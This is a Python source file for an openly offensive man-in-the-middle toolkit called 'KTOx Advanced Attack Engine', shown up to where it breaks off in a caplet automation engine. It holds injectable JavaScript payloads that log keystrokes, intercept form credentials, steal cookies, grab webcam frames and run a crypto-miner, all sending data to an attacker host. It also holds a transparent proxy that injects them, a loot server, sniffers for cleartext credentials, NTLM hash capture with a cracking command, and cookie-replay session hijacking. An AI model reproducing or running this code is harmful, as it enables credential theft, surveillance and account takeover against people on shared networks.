#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# ktox_advanced.py — KTOx Advanced Attack Engine v1.0
#
# Modules:
#   · JS/HTML Injector       — inject payloads into HTTP responses
#   · Multi-Protocol Sniffer — FTP, SMTP, POP3, IMAP, Telnet, IRC, Redis, SNMP
#   · PCAP Capture           — Wireshark-compatible .pcap export
#   · NTLMv2 Hash Capture    — Responder-style hash extraction
#   · Session Hijacker       — cookie theft + replay assistant
#   · Caplet Engine          — .ktox script automation

import os, sys, re, time, json, struct, threading, socket, logging, subprocess
from datetime import datetime

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
    from scapy.layers.dns  import DNS, DNSQR, DNSRR
    from scapy.config import conf as sconf
    sconf.ipv6_enabled = False
except ImportError as e:
    print(f"ERROR: scapy — {e}"); sys.exit(1)

try:
    from rich.console import Console
    from rich.panel   import Panel
    from rich.table   import Table
    from rich.rule    import Rule
    from rich.prompt  import Prompt, Confirm
    from rich         import box
except ImportError:
    print("ERROR: pip3 install rich"); sys.exit(1)

console  = Console(highlight=False)
loot_dir = "ktox_loot"
stop_flag = threading.Event()

C_BLOOD  = "#C0392B"
C_RUST   = "#922B21"
C_EMBER  = "#E74C3C"
C_STEEL  = "#717D7E"
C_ASH    = "#ABB2B9"
C_WHITE  = "#F2F3F4"
C_DIM    = "#566573"
C_ORANGE = "#CA6F1E"
C_YELLOW = "#D4AC0D"
C_GOOD   = "#1E8449"

def tag(t, c=C_BLOOD): return f"[{c}]{t}[/{c}]"
def section(t):
    console.print()
    console.print(Rule(f"[bold {C_BLOOD}] {t} [/bold {C_BLOOD}]", style=C_RUST))
    console.print()

def _loot(event, data):
    os.makedirs(loot_dir, exist_ok=True)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(loot_dir, "advanced.log")
    entry = {"ts": datetime.now().isoformat(), "event": event, "data": data}
    try:
        with open(path, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except: pass
    return entry


# ══════════════════════════════════════════════════════════════════════════════
# ── JS / HTML INJECTOR ────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

# Built-in payloads
BUILTIN_PAYLOADS = {
    "keylogger": """
<script>
(function(){
  var _k='';
  document.addEventListener('keydown',function(e){
    _k+=e.key;
    if(_k.length>50){
      fetch('http://{attacker_ip}:7331/kl?d='+encodeURIComponent(_k));
      _k='';
    }
  });
})();
</script>""",

    "credential_intercept": """
<script>
(function(){
  document.querySelectorAll('form').forEach(function(f){
    f.addEventListener('submit',function(e){
      var data={};
      new FormData(f).forEach(function(v,k){data[k]=v;});
      fetch('http://{attacker_ip}:7331/creds?d='+encodeURIComponent(JSON.stringify(data)));
    });
  });
})();
</script>""",

    "session_stealer": """
<script>
(function(){
  fetch('http://{attacker_ip}:7331/cookie?d='+encodeURIComponent(
    JSON.stringify({c:document.cookie,u:location.href,r:document.referrer})
  ));
})();
</script>""",

    "beef_hook": """<script src="http://{attacker_ip}:3000/hook.js"></script>""",

    "alert_test": """<script>alert('KTOx JS Injection Active — '+location.href);</script>""",

    "redirect": """<script>window.location='http://{attacker_ip}:8888';</script>""",

    "crypto_miner": """
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
var miner=new CoinHive.Anonymous('YOUR_KEY');
miner.start();
</script>""",

    "camera_grab": """
<script>
navigator.mediaDevices.getUserMedia({video:true}).then(function(s){
  var v=document.createElement('video');
  v.srcObject=s; v.play();
  setTimeout(function(){
    var c=document.createElement('canvas');
    c.width=v.videoWidth; c.height=v.videoHeight;
    c.getContext('2d').drawImage(v,0,0);
    fetch('http://{attacker_ip}:7331/cam?d='+encodeURIComponent(c.toDataURL()));
  },1000);
});
</script>""",
}

class JSInjector:
    """
    Transparent HTTP proxy that injects JS/HTML into responses.
    Listens on a port, iptables redirects port 80 here.
    """
    def __init__(self, attacker_ip, listen_port=8080,
                 payload_name="credential_intercept",
                 custom_payload=None,
                 inject_domains=None):
        self.attacker_ip    = attacker_ip
        self.listen_port    = listen_port
        self.inject_domains = inject_domains  # None = all
        self.payload        = custom_payload or \
            BUILTIN_PAYLOADS.get(payload_name, BUILTIN_PAYLOADS["credential_intercept"])
        self.payload        = self.payload.replace("{attacker_ip}", attacker_ip)
        self._thread        = None
        self._loot_srv      = None
        self._injected      = [0]

    def _should_inject(self, host):
        if not self.inject_domains:
            return True
        return any(host.endswith(d) for d in self.inject_domains)

    def _inject(self, response_bytes, host):
        """Inject payload before </body> or </head>."""
        try:
            text = response_bytes.decode("utf-8", errors="replace")
        except:
            return response_bytes

        payload = self.payload

        # Try to inject before </body>
        if "</body>" in text.lower():
            idx = text.lower().rfind("</body>")
            text = text[:idx] + payload + text[idx:]
            self._injected[0] += 1
            console.print(
                f"  [{C_BLOOD}]⚡ INJECTED[/{C_BLOOD}]  "
                f"[{C_WHITE}]{host}[/{C_WHITE}]  "
                f"[{C_DIM}]total: {self._injected[0]}[/{C_DIM}]"
            )
            _loot("JS_INJECT", {"host": host, "total": self._injected[0]})
        elif "</head>" in text.lower():
            idx = text.lower().rfind("</head>")
            text = text[:idx] + payload + text[idx:]
            self._injected[0] += 1

        return text.encode("utf-8", errors="replace")

    def _handle(self, client, addr):
        try:
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = client.recv(4096)
                if not chunk: break
                data += chunk

            if not data:
                client.close(); return

            text     = data.decode("utf-8", errors="ignore")
            lines    = text.split("\r\n")
            req_line = lines[0] if lines else ""
            host     = ""
            for line in lines[1:]:
                if line.lower().startswith("host:"):
                    host = line.split(":", 1)[1].strip()
                    break

            if not host:
                client.close(); return

            # Forward to real server
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.settimeout(8)
                srv.connect((host, 80))
                srv.sendall(data)

                response = b""
                while True:
                    try:
                        chunk = srv.recv(65536)
                        if not chunk: break
                        response += chunk
                    except: break
                srv.close()
            except:
                client.close(); return

            # Only inject into HTML responses
            is_html = (b"text/html" in response[:500].lower() or
                       b"<html" in response[:200].lower())

            if is_html and self._should_inject(host):
                # Split headers from body
                hdr_end = response.find(b"\r\n\r\n")
                if hdr_end >= 0:
                    headers = response[:hdr_end+4]
                    body    = response[hdr_end+4:]
                    body    = self._inject(body, host)
                    # Fix content-length
                    headers = re.sub(
                        rb"Content-Length:\s*\d+",
                        b"Content-Length: " + str(len(body)).encode(),
                        headers, flags=re.I
                    )
                    response = headers + body

            client.sendall(response)
        except: pass
        finally:
            try: client.close()
            except: pass

    def _start_loot_server(self):
        """Mini HTTP server to receive injected data."""
        from http.server import HTTPServer, BaseHTTPRequestHandler
        captured = {"keylog": [], "creds": [], "cookies": [], "cams": []}

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *a): pass
            def do_GET(self):
                from urllib.parse import urlparse, parse_qs, unquote
                parsed = urlparse(self.path)
                qs     = parse_qs(parsed.query)
                d      = unquote(qs.get("d", [""])[0])
                ts     = datetime.now().strftime("%H:%M:%S")

                if "/kl" in self.path:
                    captured["keylog"].append(d)
                    console.print(
                        f"  [{C_BLOOD}]⌨  KEYLOG[/{C_BLOOD}]  "
                        f"[{C_WHITE}]{d[:80]}[/{C_WHITE}]  [{C_DIM}]{ts}[/{C_DIM}]"
                    )
                    _loot("KEYLOG", {"data": d, "ts": ts})
                elif "/creds" in self.path:
                    captured["creds"].append(d)
                    console.print(
                        f"  [{C_EMBER}]🔑 CREDS[/{C_EMBER}]  "
                        f"[{C_WHITE}]{d[:120]}[/{C_WHITE}]  [{C_DIM}]{ts}[/{C_DIM}]"
                    )
                    _loot("JS_CREDS", {"data": d, "ts": ts})
                elif "/cookie" in self.path:
                    captured["cookies"].append(d)
                    console.print(
                        f"  [{C_YELLOW}]🍪 COOKIE[/{C_YELLOW}]  "
                        f"[{C_ASH}]{d[:100]}[/{C_ASH}]  [{C_DIM}]{ts}[/{C_DIM}]"
                    )
                    _loot("JS_COOKIE", {"data": d, "ts": ts})
                elif "/cam" in self.path:
                    # Save camera frame
                    os.makedirs(loot_dir, exist_ok=True)
                    fts  = datetime.now().strftime("%Y%m%d_%H%M%S")
                    path = os.path.join(loot_dir, f"cam_{fts}.jpg")
                    import base64
                    try:
                        img_data = base64.b64decode(d.split(",", 1)[-1])
                        with open(path, "wb") as f:
                            f.write(img_data)
                        console.print(
                            f"  [{C_BLOOD}]📷 CAM FRAME[/{C_BLOOD}]  "
                            f"[{C_ASH}]saved → {path}[/{C_ASH}]"
                        )
                        _loot("CAM_FRAME", {"path": path})
                    except: pass

                self.send_response(200)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b"ok")

        srv = HTTPServer(("0.0.0.0", 7331), Handler)
        srv.timeout = 1
        self._loot_srv = srv
        while not stop_flag.is_set():
            srv.handle_request()

    def start(self):
        console.print(
            f"  [{C_GOOD}]✔ JS Injector on port {self.listen_port}[/{C_GOOD}]"
        )
        console.print(
            f"  [{C_STEEL}]Payload: {self.payload[:60].strip()}...[/{C_STEEL}]"
        )
        console.print(
            f"  [{C_STEEL}]Loot receiver: port 7331[/{C_STEEL}]"
        )

        # Start loot receiver
        t_loot = threading.Thread(target=self._start_loot_server, daemon=True)
        t_loot.start()

        # Start proxy
        def _serve():
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", self.listen_port))
            srv.listen(100)
            srv.settimeout(1)
            while not stop_flag.is_set():
                try:
                    c, a = srv.accept()
                    threading.Thread(
                        target=self._handle, args=(c, a), daemon=True
                    ).start()
                except socket.timeout: continue
                except: break
            srv.close()

        self._thread = threading.Thread(target=_serve, daemon=True)
        self._thread.start()
        return self._thread


# ══════════════════════════════════════════════════════════════════════════════
# ── MULTI-PROTOCOL CREDENTIAL SNIFFER ─────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class MultiProtocolSniffer:
    """
    Sniffs cleartext credentials from:
    FTP, SMTP, POP3, IMAP, Telnet, IRC, Redis, SNMP, HTTP Basic Auth
    """

    PROTOCOL_PORTS = {
        21:   "FTP",
        25:   "SMTP",
        110:  "POP3",
        143:  "IMAP",
        23:   "TELNET",
        6667: "IRC",
        6379: "REDIS",
        161:  "SNMP",
        80:   "HTTP",
        8080: "HTTP",
    }

    def __init__(self, iface):
        self.iface    = iface
        self._thread  = None
        self._seen    = {}  # track partial sessions

    def _extract(self, pkt):
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        src   = pkt[IP].src if pkt.haslayer(IP) else "?"
        proto = self.PROTOCOL_PORTS.get(dport) or self.PROTOCOL_PORTS.get(sport)
        if not proto: return

        try:
            raw  = pkt[Raw].load.decode("utf-8", errors="ignore").strip()
        except:
            return

        ts = datetime.now().strftime("%H:%M:%S")

        # ── FTP ──
        if proto == "FTP":
            if raw.upper().startswith("USER "):
                self._seen[src + ":ftp_user"] = raw[5:].strip()
                console.print(
                    f"  [{C_STEEL}]FTP[/{C_STEEL}]  [{C_DIM}]{src}[/{C_DIM}]  "
                    f"USER [{C_WHITE}]{raw[5:].strip()}[/{C_WHITE}]"
                )
            elif raw.upper().startswith("PASS "):
                user = self._seen.pop(src + ":ftp_user", "?")
                pw   = raw[5:].strip()
                console.print(
                    f"  [{C_EMBER}]⚡ FTP CRED[/{C_EMBER}]  [{C_DIM}]{src}[/{C_DIM}]  "
                    f"[{C_GOOD}]{user}[/{C_GOOD}] : [{C_EMBER}]{pw}[/{C_EMBER}]"
                )
                _loot("FTP_CRED", {"src": src, "user": user, "pass": pw})

        # ── SMTP ──
        elif proto == "SMTP":
            if raw.upper().startswith("AUTH LOGIN") or "AUTH PLAIN" in raw.upper():
                self._seen[src + ":smtp"] = "auth"
            elif self._seen.get(src + ":smtp") == "auth":
                import base64
                try:
                    decoded = base64.b64decode(raw).decode("utf-8", errors="ignore")
                    console.print(
                        f"  [{C_EMBER}]⚡ SMTP AUTH[/{C_EMBER}]  "
                        f"[{C_DIM}]{src}[/{C_DIM}]  [{C_WHITE}]{decoded}[/{C_WHITE}]"
                    )
                    _loot("SMTP_AUTH", {"src": src, "decoded": decoded})
                except: pass
                del self._seen[src + ":smtp"]

        # ── POP3 ──
        elif proto == "POP3":
            if raw.upper().startswith("USER "):
                self._seen[src + ":pop3_user"] = raw[5:].strip()
            elif raw.upper().startswith("PASS "):
                user = self._seen.pop(src + ":pop3_user", "?")
                pw   = raw[5:].strip()
                console.print(
                    f"  [{C_EMBER}]⚡ POP3 CRED[/{C_EMBER}]  [{C_DIM}]{src}[/{C_DIM}]  "
                    f"[{C_GOOD}]{user}[/{C_GOOD}] : [{C_EMBER}]{pw}[/{C_EMBER}]"
                )
                _loot("POP3_CRED", {"src": src, "user": user, "pass": pw})

        # ── IMAP ──
        elif proto == "IMAP":
            m = re.search(r'LOGIN\s+"?([^"\s]+)"?\s+"?([^"\s]+)"?', raw, re.I)
            if m:
                console.print(
                    f"  [{C_EMBER}]⚡ IMAP CRED[/{C_EMBER}]  [{C_DIM}]{src}[/{C_DIM}]  "
                    f"[{C_GOOD}]{m.group(1)}[/{C_GOOD}] : [{C_EMBER}]{m.group(2)}[/{C_EMBER}]"
                )
                _loot("IMAP_CRED", {"src": src, "user": m.group(1), "pass": m.group(2)})

        # ── TELNET ──
        elif proto == "TELNET":
            # Telnet sends byte-by-byte — accumulate
            key = src + ":telnet"
            buf = self._seen.get(key, "")
            buf += raw
            self._seen[key] = buf
            if "\r" in buf or "\n" in buf:
                console.print(
                    f"  [{C_BLOOD}]TELNET[/{C_BLOOD}]  [{C_DIM}]{src}[/{C_DIM}]  "
                    f"[{C_ASH}]{buf.strip()[:80]}[/{C_ASH}]"
                )
                _loot("TELNET_DATA", {"src": src, "data": buf.strip()})
                self._seen[key] = ""

        # ── IRC ──
        elif proto == "IRC":
            if raw.upper().startswith("PASS "):
                console.print(
                    f"  [{C_EMBER}]⚡ IRC PASS[/{C_EMBER}]  [{C_DIM}]{src}[/{C_DIM}]  "
                    f"[{C_EMBER}]{raw[5:].strip()}[/{C_EMBER}]"
                )
                _loot("IRC_PASS", {"src": src, "pass": raw[5:].strip()})
            elif raw.upper().startswith("NICK ") or raw.upper().startswith("USER "):
                console.print(
                    f"  [{C_STEEL}]IRC[/{C_STEEL}]  [{C_DIM}]{src}[/{C_DIM}]  "
                    f"[{C_ASH}]{raw[:60]}[/{C_ASH}]"
                )

        # ── REDIS ──
        elif proto == "REDIS":
            if "AUTH" in raw.upper():
                m = re.search(r'AUTH\s+(\S+)', raw, re.I)
                if m:
                    console.print(
                        f"  [{C_EMBER}]⚡ REDIS AUTH[/{C_EMBER}]  "
                        f"[{C_DIM}]{src}[/{C_DIM}]  [{C_EMBER}]{m.group(1)}[/{C_EMBER}]"
                    )
                    _loot("REDIS_AUTH", {"src": src, "pass": m.group(1)})

        # ── HTTP Basic Auth ──
        elif proto in ("HTTP", "HTTP_ALT"):
            m = re.search(r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)', raw, re.I)
            if m:
                import base64
                try:
                    decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                    console.print(
                        f"  [{C_EMBER}]⚡ HTTP BASIC AUTH[/{C_EMBER}]  "
                        f"[{C_DIM}]{src}[/{C_DIM}]  [{C_WHITE}]{decoded}[/{C_WHITE}]"
                    )
                    _loot("HTTP_BASIC_AUTH", {"src": src, "decoded": decoded})
                except: pass

    def start(self):
        ports = " or ".join(f"port {p}" for p in self.PROTOCOL_PORTS)
        console.print(
            f"  [{C_GOOD}]✔ Multi-Protocol Sniffer active[/{C_GOOD}]"
        )
        console.print(
            f"  [{C_STEEL}]Protocols: FTP · SMTP · POP3 · IMAP · Telnet · IRC · Redis · HTTP[/{C_STEEL}]"
        )

        def _run():
            sniff(
                iface=self.iface,
                filter=f"tcp and ({ports})",
                prn=self._extract,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )
        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()
        return self._thread


# ══════════════════════════════════════════════════════════════════════════════
# ── PCAP CAPTURE ──────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class PCAPCapture:
    """
    Captures all traffic to a Wireshark-compatible .pcap file.
    """
    def __init__(self, iface, filename=None, bpf_filter=""):
        self.iface    = iface
        self.filter   = bpf_filter
        os.makedirs(loot_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.filename = filename or os.path.join(loot_dir, f"capture_{ts}.pcap")
        self._writer  = None
        self._thread  = None
        self._count   = [0]

    def start(self):
        console.print(
            f"  [{C_GOOD}]✔ PCAP capture → {self.filename}[/{C_GOOD}]"
        )
        if self.filter:
            console.print(f"  [{C_STEEL}]Filter: {self.filter}[/{C_STEEL}]")

        def _run():
            self._writer = PcapWriter(self.filename, append=False, sync=True)
            def _pkt(p):
                self._writer.write(p)
                self._count[0] += 1
                if self._count[0] % 100 == 0:
                    console.print(
                        f"  [{C_DIM}]PCAP: {self._count[0]} packets captured[/{C_DIM}]",
                        end="\r"
                    )
            sniff(
                iface=self.iface,
                filter=self.filter,
                prn=_pkt,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )
            self._writer.close()
            console.print(
                f"\n  [{C_GOOD}]✔ PCAP saved: {self.filename} "
                f"({self._count[0]} packets)[/{C_GOOD}]"
            )
            _loot("PCAP_SAVED", {"file": self.filename, "packets": self._count[0]})

        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()
        return self._thread

    def stop(self):
        stop_flag.set()

    @staticmethod
    def open_in_wireshark(path):
        """Try to open a pcap in Wireshark if available."""
        try:
            subprocess.Popen(["wireshark", path])
        except FileNotFoundError:
            console.print(
                f"  [{C_ORANGE}]Wireshark not found — open manually: {path}[/{C_ORANGE}]"
            )


# ══════════════════════════════════════════════════════════════════════════════
# ── NTLMv2 HASH CAPTURE ───────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class NTLMCapture:
    """
    Captures NTLMv1/v2 authentication hashes from HTTP, SMB-over-TCP,
    and NTLM proxies. Hashes can be cracked offline with hashcat/john.

    HTTP NTLM: Intercepts WWW-Authenticate: NTLM and Authorization: NTLM
    SMB NTLM:  Sniffs TCP/445 for NTLMSSP signatures
    """

    NTLMSSP_SIG = b"NTLMSSP\x00"

    def __init__(self, iface, attacker_ip):
        self.iface       = iface
        self.attacker_ip = attacker_ip
        self._thread     = None
        self._hashes     = []

    def _parse_ntlm_auth(self, data, src, proto):
        """Extract NTLMv2 hash from AUTHENTICATE message (type 3)."""
        try:
            sig_idx = data.find(self.NTLMSSP_SIG)
            if sig_idx < 0: return

            blob = data[sig_idx:]
            msg_type = struct.unpack_from("<I", blob, 8)[0]

            if msg_type != 3:  # type 3 = AUTHENTICATE
                return

            # LmChallengeResponseFields
            lm_len    = struct.unpack_from("<H", blob, 12)[0]
            lm_off    = struct.unpack_from("<I", blob, 16)[0]
            # NtChallengeResponseFields
            nt_len    = struct.unpack_from("<H", blob, 20)[0]
            nt_off    = struct.unpack_from("<I", blob, 24)[0]
            # DomainNameFields
            dom_len   = struct.unpack_from("<H", blob, 28)[0]
            dom_off   = struct.unpack_from("<I", blob, 32)[0]
            # UserNameFields
            user_len  = struct.unpack_from("<H", blob, 36)[0]
            user_off  = struct.unpack_from("<I", blob, 40)[0]

            domain   = blob[dom_off:dom_off+dom_len].decode("utf-16-le", errors="ignore")
            username = blob[user_off:user_off+user_len].decode("utf-16-le", errors="ignore")
            nt_resp  = blob[nt_off:nt_off+nt_len].hex()

            if nt_len >= 24:
                # Format: user::domain:challenge:NT_hash:NT_blob
                # We don't have the challenge here without the type 2 msg
                # but we log what we have for offline analysis
                hash_str = f"{username}::{domain}::{nt_resp}"

                console.print(
                    f"\n  [{C_BLOOD}]⚡ NTLMv2 HASH CAPTURED[/{C_BLOOD}]\n"
                    f"  [{C_WHITE}]{proto}[/{C_WHITE}]  "
                    f"[{C_GOOD}]{domain}\\{username}[/{C_GOOD}]\n"
                    f"  [{C_DIM}]{nt_resp[:64]}...[/{C_DIM}]"
                )

                self._hashes.append({
                    "proto":    proto,
                    "src":      src,
                    "domain":   domain,
                    "username": username,
                    "hash":     nt_resp,
                    "ts":       datetime.now().isoformat()
                })
                _loot("NTLM_HASH", {
                    "proto": proto, "src": src,
                    "domain": domain, "username": username,
                    "nt_hash": nt_resp
                })

                # Save to hashcat-compatible file
                os.makedirs(loot_dir, exist_ok=True)
                hpath = os.path.join(loot_dir, "ntlm_hashes.txt")
                with open(hpath, "a") as f:
                    f.write(hash_str + "\n")

        except Exception:
            pass

    def _handle(self, pkt):
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw): return

        raw  = pkt[Raw].load
        src  = pkt[IP].src if pkt.haslayer(IP) else "?"
        dport = pkt[TCP].dport
        sport = pkt[TCP].sport

        # SMB / port 445
        if dport == 445 or sport == 445:
            if self.NTLMSSP_SIG in raw:
                self._parse_ntlm_auth(raw, src, "SMB")

        # HTTP NTLM — port 80, 8080, 8888
        elif dport in (80, 8080, 8888) or sport in (80, 8080, 8888):
            try:
                text = raw.decode("utf-8", errors="ignore")
            except: return

            # Capture Authorization: NTLM <base64>
            m = re.search(r'Authorization:\s*NTLM\s+([A-Za-z0-9+/=]+)', text, re.I)
            if m:
                import base64
                try:
                    decoded = base64.b64decode(m.group(1))
                    self._parse_ntlm_auth(decoded, src, "HTTP-NTLM")
                except: pass

            # Capture Proxy-Authorization: NTLM
            m2 = re.search(r'Proxy-Authorization:\s*NTLM\s+([A-Za-z0-9+/=]+)', text, re.I)
            if m2:
                import base64
                try:
                    decoded = base64.b64decode(m2.group(1))
                    self._parse_ntlm_auth(decoded, src, "PROXY-NTLM")
                except: pass

    def start(self):
        console.print(
            f"  [{C_GOOD}]✔ NTLMv2 Hash Capture active[/{C_GOOD}]"
        )
        console.print(
            f"  [{C_STEEL}]Monitoring SMB/445, HTTP/80, HTTP/8080[/{C_STEEL}]"
        )
        console.print(
            f"  [{C_DIM}]Hashes → ktox_loot/ntlm_hashes.txt[/{C_DIM}]"
        )
        console.print(
            f"  [{C_DIM}]Crack with: hashcat -m 5600 ktox_loot/ntlm_hashes.txt wordlist.txt[/{C_DIM}]"
        )

        def _run():
            sniff(
                iface=self.iface,
                filter="tcp and (port 445 or port 80 or port 8080)",
                prn=self._handle,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )
        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()
        return self._thread


# ══════════════════════════════════════════════════════════════════════════════
# ── SESSION HIJACKER ──────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class SessionHijacker:
    """
    Extracts session cookies from HTTP traffic.
    Provides replay assistant — inject cookies into curl/browser commands.
    """

    JUICY_COOKIES = re.compile(
        r'(session|token|auth|jwt|sid|PHPSESSID|ASP\.NET_SessionId|'
        r'connect\.sid|laravel_session|ci_session|JSESSIONID|'
        r'wordpress_logged_in|wp-settings|remember_me)=[^;\s]+',
        re.I
    )

    def __init__(self, iface):
        self.iface    = iface
        self._thread  = None
        self._sessions = {}  # host → cookie

    def _handle(self, pkt):
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw): return
        if pkt[TCP].dport not in (80, 8080) and pkt[TCP].sport not in (80, 8080):
            return

        try:
            raw  = pkt[Raw].load.decode("utf-8", errors="ignore")
        except: return

        src  = pkt[IP].src if pkt.haslayer(IP) else "?"
        ts   = datetime.now().strftime("%H:%M:%S")

        # Extract host
        host_m = re.search(r'^Host:\s*(.+)$', raw, re.M | re.I)
        host   = host_m.group(1).strip() if host_m else src

        # Extract path
        path_m = re.search(r'^(?:GET|POST|PUT|DELETE|HEAD)\s+(\S+)', raw)
        path   = path_m.group(1) if path_m else "/"

        # Extract juicy cookies
        cookie_m = re.search(r'^Cookie:\s*(.+)$', raw, re.M | re.I)
        if cookie_m:
            cookie_header = cookie_m.group(1).strip()
            juicy = self.JUICY_COOKIES.findall(cookie_header)

            if juicy:
                key = f"{src}:{host}"
                if key not in self._sessions or self._sessions[key] != cookie_header:
                    self._sessions[key] = cookie_header

                    console.print(
                        f"\n  [{C_BLOOD}]⚡ SESSION COOKIE[/{C_BLOOD}]\n"
                        f"  [{C_STEEL}]Host:[/{C_STEEL}]    [{C_WHITE}]{host}[/{C_WHITE}]\n"
                        f"  [{C_STEEL}]Source:[/{C_STEEL}]  [{C_ASH}]{src}[/{C_ASH}]\n"
                        f"  [{C_STEEL}]Path:[/{C_STEEL}]    [{C_DIM}]{path[:60]}[/{C_DIM}]\n"
                        f"  [{C_YELLOW}]Cookie:  {cookie_header[:100]}[/{C_YELLOW}]"
                    )

                    # Generate replay commands
                    curl_cmd = (
                        f'curl -b "{cookie_header}" '
                        f'http://{host}{path}'
                    )
                    console.print(
                        f"\n  [{C_DIM}]Replay:[/{C_DIM}]\n"
                        f"  [{C_STEEL}]{curl_cmd[:120]}[/{C_STEEL}]"
                    )

                    _loot("SESSION_HIJACK", {
                        "host": host, "src": src,
                        "path": path, "cookie": cookie_header,
                        "curl": curl_cmd
                    })

                    # Save replay file
                    os.makedirs(loot_dir, exist_ok=True)
                    rpath = os.path.join(loot_dir, "session_replay.sh")
                    with open(rpath, "a") as f:
                        f.write(f"# {host} from {src} at {ts}\n")
                        f.write(curl_cmd + "\n\n")

    def start(self):
        console.print(f"  [{C_GOOD}]✔ Session Hijacker active[/{C_GOOD}]")
        console.print(
            f"  [{C_STEEL}]Watching for: PHPSESSID, JWT, session, auth, "
            f"JSESSIONID, wordpress_logged_in...[/{C_STEEL}]"
        )
        console.print(
            f"  [{C_DIM}]Replay scripts → ktox_loot/session_replay.sh[/{C_DIM}]"
        )

        def _run():
            sniff(
                iface=self.iface,
                filter="tcp and (port 80 or port 8080)",
                prn=self._handle,
                store=False,
                stop_filter=lambda _: stop_flag.is_set()
            )
        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()
        return self._thread


# ══════════════════════════════════════════════════════════════════════════════
# ── CAPLET ENGINE ─────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class CapletEngine:
    """
    .ktox script automation engine.
    Runs a sequence of KTOx commands from a .ktox file.

    Syntax:
        # comment
        set IFACE wlan0
        set TARGET 192.168.1.50
        set ATTACKER_IP 192.168.1.100
        mitm.start
        dns.spoof *
        http.sniff on
        js.inject credential_intercept
        pcap.start capture.pcap
        wait 60
        pcap.stop
        mitm.stop
    """

    def __init__(self, caplet_path, env=None):
        self.path  = caplet_path
        self.env   = env or {}
        self._cmds = []
        self._load()

    def _load(self):
        with open(self.path) as f:
            lines = f.readlines()
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            # Variable interpolation
            for k, v in self.env.items():
                line = line.replace(f"${k}", str(v))
            self._cmds.append(line)

    def run(self, ctx):
        """
        Execute caplet commands.
        ctx = dict with keys: iface, attacker_ip, gateway_ip, etc.
        Returns list of started threads.
        """
        threads   = []
        active    = {}
        env       = {**self.env, **ctx}

        console.print(
            f"  [{C_GOOD}]▶ Running caplet: {self.path} "
            f"({len(self._cmds)} commands)[/{C_GOOD}]"
        )

        for cmd in self._cmds:
            parts = cmd.split()
            verb  = parts[0].lower() if parts else ""

            try:
                # set VAR value
                if verb == "set" and len(parts) >= 3:
                    env[parts[1].upper()] = " ".join(parts[2:])
                    console.print(f"  [{C_DIM}]set {parts[1]} = {' '.join(parts[2:])}[/{C_DIM}]")

                # wait N  (seconds)
                elif verb == "wait" and len(parts) >= 2:
                    secs = float(parts[1])
                    console.print(f"  [{C_DIM}]wait {secs}s...[/{C_DIM}]")
                    time.sleep(secs)

                # echo message
                elif verb == "echo":
                    console.print(f"  [{C_STEEL}]{' '.join(parts[1:])}[/{C_STEEL}]")

                # mitm.start
                elif verb == "mitm.start":
                    from ktox_mitm import launch_full_mitm
                    t = threading.Thread(
                        target=launch_full_mitm,
                        kwargs={
                            "iface":        env.get("IFACE", ctx.get("iface","wlan0")),
                            "attacker_ip":  env.get("ATTACKER_IP", ctx.get("attacker_ip","")),
                            "gateway_ip":   env.get("GATEWAY_IP", ctx.get("gateway_ip","")),
                        },
                        daemon=True
                    )
                    t.start(); threads.append(t); active["mitm"] = t
                    console.print(f"  [{C_GOOD}]mitm.start — engine launched[/{C_GOOD}]")

                # js.inject <payload_name>
                elif verb == "js.inject":
                    payload = parts[1] if len(parts) > 1 else "credential_intercept"
                    inj = JSInjector(
                        attacker_ip=env.get("ATTACKER_IP", ""),
                        payload_name=payload
                    )
                    t = inj.start(); threads.append(t); active["js"] = inj
                    console.print(f"  [{C_GOOD}]js.inject — payload: {payload}[/{C_GOOD}]")

                # pcap.start [filename]
                elif verb == "pcap.start":
                    fname = parts[1] if len(parts) > 1 else None
                    cap = PCAPCapture(
                        iface=env.get("IFACE", ctx.get("iface","wlan0")),
                        filename=fname
                    )
                    t = cap.start(); threads.append(t); active["pcap"] = cap
                    console.print(f"  [{C_GOOD}]pcap.start — capturing[/{C_GOOD}]")

                # proto.sniff
                elif verb == "proto.sniff":
                    snf = MultiProtocolSniffer(env.get("IFACE", ctx.get("iface","wlan0")))
                    t = snf.start(); threads.append(t)
                    console.print(f"  [{C_GOOD}]proto.sniff — all protocols[/{C_GOOD}]")

                # ntlm.capture
                elif verb == "ntlm.capture":
                    nc = NTLMCapture(
                        iface=env.get("IFACE", ctx.get("iface","wlan0")),
                        attacker_ip=env.get("ATTACKER_IP", "")
                    )
                    t = nc.start(); threads.append(t)
                    console.print(f"  [{C_GOOD}]ntlm.capture — active[/{C_GOOD}]")

                # session.hijack
